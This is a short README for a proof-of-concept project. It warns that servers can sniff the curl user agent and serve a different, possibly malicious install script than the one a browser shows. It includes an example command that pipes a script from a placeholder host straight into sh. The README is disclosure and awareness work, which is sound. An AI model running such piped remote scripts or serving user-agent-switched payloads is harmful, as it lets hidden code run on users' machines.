pipe-to-sh Proof of Concept
===========================

Piping direct to sh from the web has its obvious dangers along with some
not so obvious hidden ones..

This project showcases a possible, non-obvious exploit which relies on
sniffing the browser's user agent string to change a served .sh file dependent
on whether or not the browser is curl/libcurl. This would allow a malicious
person to point a user to a perfectly reasonable looking .sh file while in
the background providing a different - perhaps evil - .sh file to the user
told to download via [curl/libcurl](http://curl.haxx.se/) like so:

    curl -s http://blah.com/install.sh | sh

This is a proof of concept; no damaging code is contained within.

For more on this please see the post on [djm.org.uk](http://www.djm.org.uk "Darian Moody, Python Developer, London").
